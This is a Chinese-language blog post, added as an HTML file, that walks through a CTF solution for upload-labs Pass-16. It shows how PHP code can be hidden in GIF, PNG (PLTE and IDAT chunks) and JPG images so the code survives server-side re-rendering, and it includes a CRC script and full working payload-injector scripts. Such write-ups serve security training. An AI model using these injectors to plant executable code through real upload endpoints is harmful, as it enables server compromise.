@@ -1,0 +1,599 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		 
+			
+  
+    <meta name="twitter:card" content="summary"/>
+    
+      <meta name="twitter:image" content="http://yang1k.github.io/images/avatar.png" />
+    
+  
+  
+  <meta name="twitter:title" content="upload-labs Pass-16"/>
+  <meta name="twitter:description" content="前记
+
+upload-labs,是一个关于文件上传的靶场.具体的write-up社区里也都有文章.
+不过我在看了pass-16的源码后,发现了一些有意思的东西.
+"/>
+  
+  
+  
+  
+    <meta name="twitter:creator" content="@Yang1k"/>
+  
+
+
+
+		
+		<meta name="author" content="Yang1k">
+		<meta name="description" content="Site Description">
+		<meta name="generator" content="Hugo 0.56.0" />
+		<title>upload-labs Pass-16 &middot; Yang1k</title>
+		<link rel="shortcut icon" href="http://yang1k.github.io/images/favicon.ico">
+		<link rel="stylesheet" href="http://yang1k.github.io/css/style.css">
+		<link rel="stylesheet" href="http://yang1k.github.io/css/highlight.css">
+
+		
+		<link rel="stylesheet" href="http://yang1k.github.io/css/font-awesome.min.css">
+		
+
+		
+		<link href="http://yang1k.github.io/index.xml" rel="alternate" type="application/rss+xml" title="Yang1k" />
+		
+
+		
+	</head>
+
+    <body>
+       <nav class="main-nav">
+	
+	
+		<a href='http://yang1k.github.io/'> <span class="arrow">←</span>Home</a>
+	
+	<a href='http://yang1k.github.io/post'>Archive</a>
+	<a href='http://yang1k.github.io/tags'>Tags</a>
+	<a href='http://yang1k.github.io/about'>About</a>
+
+	
+
+	
+	<a class="" href="http://yang1k.github.io/index.xml">RSS</a>
+	
+</nav>
+
+
+        <section id="wrapper" class="post">
+            <article>
+                <header>
+                    <h1>
+                        upload-labs Pass-16
+                    </h1>
+                    <h2 class="headline">
+                    Aug 30, 2018 09:54
+                    · 732 words
+                    · 4 minute read
+                      <span class="tags">
+                      
+                      
+                          
+                              <a href="http://yang1k.github.io/tags/ctf">ctf</a>
+                          
+                      
+                      
+                      </span>
+                    </h2>
+                </header>
+                
+                  
+                    <div id="toc">
+                      <nav id="TableOfContents">
+<ul>
+<li>
+<ul>
+<li><a href="#前记">前记</a></li>
+<li><a href="#分析问题">分析问题</a></li>
+<li><a href="#上传gif">上传gif</a></li>
+<li><a href="#上传png">上传png</a>
+<ul>
+<li><a href="#png文件组成">png文件组成</a></li>
+<li><a href="#分析数据块">分析数据块</a>
+<ul>
+<li><a href="#ihdr">IHDR</a></li>
+<li><a href="#plte">PLTE</a></li>
+<li><a href="#idat">IDAT</a></li>
+<li><a href="#iend">IEND</a></li>
+</ul></li>
+<li><a href="#写入php代码">写入php代码</a>
+<ul>
+<li><a href="#写入plte数据块">写入PLTE数据块</a></li>
+<li><a href="#写入idat数据块">写入IDAT数据块</a></li>
+</ul></li>
+</ul></li>
+<li><a href="#上传jpg">上传jpg</a>
+<ul>
+<li><a href="#准备">准备</a></li>
+<li><a href="#插入php代码">插入php代码</a></li>
+<li><a href="#上传图片马">上传图片马</a></li>
+<li><a href="#验证">验证</a></li>
+</ul></li>
+<li><a href="#后记">后记</a></li>
+</ul></li>
+</ul>
+</nav>
+                    </div>
+                  
+                
+                <section id="post-body">
+                    <h2 id="前记">前记</h2>
+
+<p><a href="https://github.com/c0ny1/upload-labs">upload-labs</a>,是一个关于文件上传的靶场.具体的write-up社区里也都有文章.
+不过我在看了pass-16的源码后,发现了一些有意思的东西.
+<!-- more --></p>
+
+<blockquote>
+<p><a href="https://xz.aliyun.com/t/2657">本文已首发先知社区</a></p>
+
+<h2 id="分析问题">分析问题</h2>
+</blockquote>
+
+<p>关于检测gif的代码</p>
+
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829080022-863d9e1c-ab1e-1.png" alt="" /></p>
+
+<p>第71行检测<code>$fileext</code>和<code>$filetype</code>是否为gif格式.</p>
+
+<p>然后73行使用<code>move_uploaded_file</code>函数来做判断条件,如果成功将文件移动到<code>$target_path</code>,就会进入二次渲染的代码,反之上传失败.</p>
+
+<p>在这里有一个问题,如果作者是想考察绕过二次渲染的话,在<code>move_uploaded_file($tmpname,$target_path)</code>返回true的时候,就已经成功将图片马上传到服务器了,所以下面的二次渲染并不会影响到图片马的上传.如果是想考察文件后缀和<code>content-type</code>的话,那么二次渲染的代码就很多余.(到底考点在哪里,只有作者清楚.哈哈)</p>
+
+<p>由于在二次渲染时重新生成了文件名,所以可以根据上传后的文件名,来判断上传的图片是二次渲染后生成的图片还是直接由<code>move_uploaded_file</code>函数移动的图片.</p>
+
+<p>我看过的writeup都是直接由<code>move_uploaded_file</code>函数上传的图片马.今天我们把<code>move_uploaded_file</code>这个判断条件去除,然后尝试上传图片马.</p>
+
+<h2 id="上传gif">上传gif</h2>
+
+<p>将<code>&lt;?php phpinfo(); ?&gt;</code>添加到111.gif的尾部.</p>
+
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829080047-955e61d8-ab1e-1.png" alt="2.png" title="2.png" /></p>
+
+<p>成功上传含有一句话的111.gif,但是这并没有成功.我们将上传的图片下载到本地.
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829080104-9f92f704-ab1e-1.png" alt="3.png" title="3.png" /></p>
+
+<p>可以看到下载下来的文件名已经变化,所以这是经过二次渲染的图片.我们使用16进制编辑器将其打开.
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829080124-ab863f08-ab1e-1.png" alt="4.png" title="4.png" /></p>
+
+<p>可以发现,我们在gif末端添加的php代码已经被去除.</p>
+
+<p>关于绕过gif的二次渲染,我们只需要找到渲染前后没有变化的位置,然后将php代码写进去,就可以成功上传带有php代码的图片了.</p>
+
+<p>经过对比,蓝色部分是没有发生变化的,
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829080145-b7a5acd8-ab1e-1.png" alt="5" title="5" /></p>
+
+<p>我们将代码写到该位置.
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829080202-c21317f0-ab1e-1.png" alt="6" title="6" /></p>
+
+<p>上传后在下载到本地使用16进制编辑器打开
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829080220-cc6628b4-ab1e-1.png" alt="7" title="7" /></p>
+
+<p>可以看到php代码没有被去除.成功上传图片马</p>
+
+<h2 id="上传png">上传png</h2>
+
+<p>png的二次渲染的绕过并不能像gif那样简单.</p>
+
+<h3 id="png文件组成">png文件组成</h3>
+
+<p>png图片由3个以上的数据块组成.</p>
+
+<p>PNG定义了两种类型的数据块，一种是称为关键数据块(critical chunk)，这是标准的数据块，另一种叫做辅助数据块(ancillary chunks)，这是可选的数据块。关键数据块定义了3个标准数据块(IHDR,IDAT, IEND)，每个PNG文件都必须包含它们.</p>
+
+<p>数据块结构
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829080241-d8e3d302-ab1e-1.png" alt="8" title="8" /></p>
+
+<p>CRC(cyclic redundancy check)域中的值是对Chunk Type Code域和Chunk Data域中的数据进行计算得到的。CRC具体算法定义在ISO 3309和ITU-T V.42中，其值按下面的CRC码生成多项式进行计算：</p>
+
+<p>x32+x26+x23+x22+x16+x12+x11+x10+x8+x7+x5+x4+x2+x+1</p>
+
+<h3 id="分析数据块">分析数据块</h3>
+
+<h4 id="ihdr">IHDR</h4>
+
+<p>数据块IHDR(header chunk)：它包含有PNG文件中存储的图像数据的基本信息，并要作为第一个数据块出现在PNG数据流中，而且一个PNG数据流中只能有一个文件头数据块。</p>
+
+<p>文件头数据块由13字节组成，它的格式如下图所示。
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829080259-e3e523f0-ab1e-1.png" alt="9" title="9" /></p>
+
+<h4 id="plte">PLTE</h4>
+
+<p>调色板PLTE数据块是辅助数据块,对于索引图像，调色板信息是必须的，调色板的颜色索引从0开始编号，然后是1、2……，调色板的颜色数不能超过色深中规定的颜色数（如图像色深为4的时候，调色板中的颜色数不可以超过2^4=16），否则，这将导致PNG图像不合法。</p>
+
+<h4 id="idat">IDAT</h4>
+
+<p>图像数据块IDAT(image data chunk)：它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。</p>
+
+<p>IDAT存放着图像真正的数据信息，因此，如果能够了解IDAT的结构，我们就可以很方便的生成PNG图像</p>
+
+<h4 id="iend">IEND</h4>
+
+<p>图像结束数据IEND(image trailer chunk)：它用来标记PNG文件或者数据流已经结束，并且必须要放在文件的尾部。</p>
+
+<p>如果我们仔细观察PNG文件，我们会发现，文件的结尾12个字符看起来总应该是这样的：</p>
+
+<p>00 00 00 00 49 45 4E 44 AE 42 60 82</p>
+
+<h3 id="写入php代码">写入php代码</h3>
+
+<p>在网上找到了两种方式来制作绕过二次渲染的png木马.</p>
+
+<h4 id="写入plte数据块">写入PLTE数据块</h4>
+
+<p>php底层在对PLTE数据块验证的时候,主要进行了CRC校验.所以可以再chunk data域插入php代码,然后重新计算相应的crc值并修改即可.</p>
+
+<p>这种方式只针对索引彩色图像的png图片才有效,在选取png图片时可根据IHDR数据块的color type辨别.<code>03</code>为索引彩色图像.</p>
+
+<ol>
+<li><p>在PLTE数据块写入php代码.
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829080322-f192fbe4-ab1e-1.png" alt="10" title="10" /></p></li>
+
+<li><p>计算PLTE数据块的CRC
+CRC脚本</p>
+
+<pre><code>import binascii
+import re
+
+png = open(r'2.png','rb')
+a = png.read()
+png.close()
+hexstr = binascii.b2a_hex(a)
+
+''' PLTE crc '''
+data =  '504c5445'+ re.findall('504c5445(.*?)49444154',hexstr)[0]
+crc = binascii.crc32(data[:-16].decode('hex')) &amp; 0xffffffff
+print hex(crc)
+
+</code></pre></li>
+</ol>
+
+<p>运行结果</p>
+
+<pre><code>526579b0
+</code></pre>
+
+<p>3.修改CRC值</p>
+
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829080349-018bd3e0-ab1f-1.png" alt="11" title="11" /></p>
+
+<p>4.验证
+将修改后的png图片上传后,下载到本地打开
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829080409-0d9f8bea-ab1f-1.png" alt="12" title="12" /></p>
+
+<h4 id="写入idat数据块">写入IDAT数据块</h4>
+
+<p>这里有国外大牛写的脚本,直接拿来运行即可.</p>
+
+<pre><code>
+&lt;?php
+$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
+           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
+           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
+           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
+           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
+           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
+           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
+           0x66, 0x44, 0x50, 0x33);
+
+
+
+$img = imagecreatetruecolor(32, 32);
+
+for ($y = 0; $y &lt; sizeof($p); $y += 3) {
+   $r = $p[$y];
+   $g = $p[$y+1];
+   $b = $p[$y+2];
+   $color = imagecolorallocate($img, $r, $g, $b);
+   imagesetpixel($img, round($y / 3), 0, $color);
+}
+
+imagepng($img,'./1.png');
+?&gt;
+
+
+</code></pre>
+
+<p>运行后得到1.png.上传后下载到本地打开如下图</p>
+
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829080441-20d2cc5e-ab1f-1.png" alt="13" title="13" /></p>
+
+<h2 id="上传jpg">上传jpg</h2>
+
+<p>这里也采用国外大牛编写的脚本jpg_payload.php.</p>
+
+<pre><code>&lt;?php
+	/*
+
+	The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().
+	It is necessary that the size and quality of the initial image are the same as those of the processed image.
+
+	1) Upload an arbitrary image via secured files upload script
+	2) Save the processed image and launch:
+	jpg_payload.php &lt;jpg_name.jpg&gt;
+
+	In case of successful injection you will get a specially crafted image, which should be uploaded again.
+
+	Since the most straightforward injection method is used, the following problems can occur:
+	1) After the second processing the injected data may become partially corrupted.
+	2) The jpg_payload.php script outputs &quot;Something's wrong&quot;.
+	If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.
+
+	Sergey Bobrov @Black2Fan.
+
+	See also:
+	https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/
+
+	*/
+
+	$miniPayload = &quot;&lt;?=phpinfo();?&gt;&quot;;
+
+
+	if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {
+    	die('php-gd is not installed');
+	}
+	
+	if(!isset($argv[1])) {
+		die('php jpg_payload.php &lt;jpg_name.jpg&gt;');
+	}
+
+	set_error_handler(&quot;custom_error_handler&quot;);
+
+	for($pad = 0; $pad &lt; 1024; $pad++) {
+		$nullbytePayloadSize = $pad;
+		$dis = new DataInputStream($argv[1]);
+		$outStream = file_get_contents($argv[1]);
+		$extraBytes = 0;
+		$correctImage = TRUE;
+
+		if($dis-&gt;readShort() != 0xFFD8) {
+			die('Incorrect SOI marker');
+		}
+
+		while((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) {
+			$marker = $dis-&gt;readByte();
+			$size = $dis-&gt;readShort() - 2;
+			$dis-&gt;skip($size);
+			if($marker === 0xDA) {
+				$startPos = $dis-&gt;seek();
+				$outStreamTmp = 
+					substr($outStream, 0, $startPos) . 
+					$miniPayload . 
+					str_repeat(&quot;\0&quot;,$nullbytePayloadSize) . 
+					substr($outStream, $startPos);
+				checkImage('_'.$argv[1], $outStreamTmp, TRUE);
+				if($extraBytes !== 0) {
+					while((!$dis-&gt;eof())) {
+						if($dis-&gt;readByte() === 0xFF) {
+							if($dis-&gt;readByte !== 0x00) {
+								break;
+							}
+						}
+					}
+					$stopPos = $dis-&gt;seek() - 2;
+					$imageStreamSize = $stopPos - $startPos;
+					$outStream = 
+						substr($outStream, 0, $startPos) . 
+						$miniPayload . 
+						substr(
+							str_repeat(&quot;\0&quot;,$nullbytePayloadSize).
+								substr($outStream, $startPos, $imageStreamSize),
+							0,
+							$nullbytePayloadSize+$imageStreamSize-$extraBytes) . 
+								substr($outStream, $stopPos);
+				} elseif($correctImage) {
+					$outStream = $outStreamTmp;
+				} else {
+					break;
+				}
+				if(checkImage('payload_'.$argv[1], $outStream)) {
+					die('Success!');
+				} else {
+					break;
+				}
+			}
+		}
+	}
+	unlink('payload_'.$argv[1]);
+	die('Something\'s wrong');
+
+	function checkImage($filename, $data, $unlink = FALSE) {
+		global $correctImage;
+		file_put_contents($filename, $data);
+		$correctImage = TRUE;
+		imagecreatefromjpeg($filename);
+		if($unlink)
+			unlink($filename);
+		return $correctImage;
+	}
+
+	function custom_error_handler($errno, $errstr, $errfile, $errline) {
+		global $extraBytes, $correctImage;
+		$correctImage = FALSE;
+		if(preg_match('/(\d+) extraneous bytes before marker/', $errstr, $m)) {
+			if(isset($m[1])) {
+				$extraBytes = (int)$m[1];
+			}
+		}
+	}
+
+	class DataInputStream {
+		private $binData;
+		private $order;
+		private $size;
+
+		public function __construct($filename, $order = false, $fromString = false) {
+			$this-&gt;binData = '';
+			$this-&gt;order = $order;
+			if(!$fromString) {
+				if(!file_exists($filename) || !is_file($filename))
+					die('File not exists ['.$filename.']');
+				$this-&gt;binData = file_get_contents($filename);
+			} else {
+				$this-&gt;binData = $filename;
+			}
+			$this-&gt;size = strlen($this-&gt;binData);
+		}
+
+		public function seek() {
+			return ($this-&gt;size - strlen($this-&gt;binData));
+		}
+
+		public function skip($skip) {
+			$this-&gt;binData = substr($this-&gt;binData, $skip);
+		}
+
+		public function readByte() {
+			if($this-&gt;eof()) {
+				die('End Of File');
+			}
+			$byte = substr($this-&gt;binData, 0, 1);
+			$this-&gt;binData = substr($this-&gt;binData, 1);
+			return ord($byte);
+		}
+
+		public function readShort() {
+			if(strlen($this-&gt;binData) &lt; 2) {
+				die('End Of File');
+			}
+			$short = substr($this-&gt;binData, 0, 2);
+			$this-&gt;binData = substr($this-&gt;binData, 2);
+			if($this-&gt;order) {
+				$short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]);
+			} else {
+				$short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]);
+			}
+			return $short;
+		}
+
+		public function eof() {
+			return !$this-&gt;binData||(strlen($this-&gt;binData) === 0);
+		}
+	}
+?&gt;
+
+
+</code></pre>
+
+<p>使用方法</p>
+
+<h3 id="准备">准备</h3>
+
+<p>随便找一个jpg图片,先上传至服务器然后再下载到本地保存为<code>1.jpg</code>.</p>
+
+<h3 id="插入php代码">插入php代码</h3>
+
+<p>使用脚本处理<code>1.jpg</code>,命令<code>php jpg_payload.php 1.jpg</code>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829080508-30c2d942-ab1f-1.png" alt="14" title="14" />
+使用16进制编辑器打开,就可以看到插入的php代码.
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829080528-3cdba2c2-ab1f-1.png" alt="15" title="15" /></p>
+
+<h3 id="上传图片马">上传图片马</h3>
+
+<p>将生成的<code>payload_1.jpg</code>上传.
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829080545-46da4670-ab1f-1.png" alt="16" title="16" /></p>
+
+<h3 id="验证">验证</h3>
+
+<p>将上传的图片再次下载到本地,使用16进制编辑器打开
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20180829080602-5124e8ec-ab1f-1.png" alt="17" title="17" /></p>
+
+<p>可以看到,php代码没有被去除.
+证明我们成功上传了含有php代码的图片.</p>
+
+<p>需要注意的是,有一些jpg图片不能被处理,所以要多尝试一些jpg图片.</p>
+
+<h2 id="后记">后记</h2>
+
+<p>询问了c0ny1, pass16预期考察的确实是二次渲染,原先的题目存在一些逻辑问题,现在bug已经修改了,感谢c0ny1师傅提供和维护upload-labs这个靶场.</p>
+
+<blockquote>
+<p><a href="https://github.com/Yang1k/upload-labs-Pass16">文章中的素材</a></p>
+</blockquote>
+                </section>
+            </article>
+
+            
+                <a class="twitter" href="https://twitter.com/intent/tweet?text=http%3a%2f%2fyang1k.github.io%2fpost%2fupload-pass16%2f - upload-labs%20Pass-16 "><span class="icon-twitter"> tweet</span></a>
+
+<a class="facebook" href="#" onclick="
+    window.open(
+      'https://www.facebook.com/sharer/sharer.php?u='+encodeURIComponent(location.href),
+      'facebook-share-dialog',
+      'width=626,height=436');
+    return false;"><span class="icon-facebook-rect"> Share</span>
+</a>
+
+            
+
+            
+                <div id="disqus_thread"></div>
+<script type="text/javascript">
+    var disqus_shortname = 'your_disqus_short_name'; 
+
+     
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+
+            
+
+            
+
+            <footer id="footer">
+    
+    <p class="small">
+    
+       © Copyright 2019 <i class="fa fa-heart" aria-hidden="true"></i> Yang1k
+    
+    </p>
+    <p class="small">
+        Powered by <a href="http://www.gohugo.io/">Hugo</a> Theme By <a href="https://github.com/nodejh/hugo-theme-cactus-plus">nodejh</a>
+    </p>
+</footer>
+
+        </section>
+
+        <script src="http://yang1k.github.io/js/jquery-3.3.1.min.js"></script>
+<script src="http://yang1k.github.io/js/main.js"></script>
+<script src="http://yang1k.github.io/js/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+
+
+
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'your_google_analytics_id', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+
+
+
+
+    </body>
+</html>
